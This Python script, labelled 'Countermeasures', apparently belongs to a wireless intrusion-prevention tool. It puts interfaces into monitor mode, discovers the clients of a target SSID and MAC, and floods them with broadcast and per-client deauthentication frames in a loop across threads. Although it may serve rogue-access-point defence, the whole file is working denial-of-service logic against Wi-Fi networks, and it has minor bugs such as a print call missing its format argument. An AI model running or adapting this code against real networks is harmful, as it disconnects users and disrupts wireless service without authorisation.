#!/usr/bin/python3

# Countermeasures

import iw
import threading
import time

attacker_pool = []
quit = False

def add_attacker(netif):
	global attacker_pool
	print("[netif %s] adding as attacker interface")
	iwif = iw.IW(netif)
	iwif.monitor_on()

	poolentry = {
		"iw" : iwif,
		"count" : 0,
		"threads" : []
	}

	attacker_pool.append(poolentry)

def netif_attack_thread(wif, ssid, mac):
	global quit
	clients = []
	mode = 0 # 0 = client discovery, 1 = active attack

	start = time.time()
	while not quit:
		if mode == 0:
			sresult = wif.scan_clients(mac)
			if sresult:
				clients = [e for e in (sresult + clients) if e not in clients]
			if time.time() - start > 2:
				mode = 1
				start = time.time()
				#print("[netif %s (ATK)] switched to active attack mode" % wif.netif)
		elif mode == 1:
			# broadcast method
			wif.deauth(ssid, mac)

			# client addressed method
			for client in clients:
				wif.deauth(ssid, mac, client)
			if time.time() - start > 5:
				mode = 0
				start = time.time()
				clients = []
				#print("[netif %s (ATK)] switched to client discovery mode" % wif.netif)

def get_interface():
	global attacker_pool
	minc = 0
	minif = None
	for dev in attacker_pool:
		if not minif or dev["count"] < minc:
			minc = dev["count"]
			minif = dev
	return minif

def attack(ssid, mac):
	wif = get_interface()
	if not wif:
		return
	t = threading.Thread(target=netif_attack_thread, args=(wif["iw"], ssid, mac))
	wif["threads"].append(t)
	t.start()

def cleanup():
	global attacker_pool
	global quit

	quit = True
	time.sleep(1)
	for dev in attacker_pool:
		dev["iw"].monitor_off()
		dev["iw"] = None
	attacker_pool = []
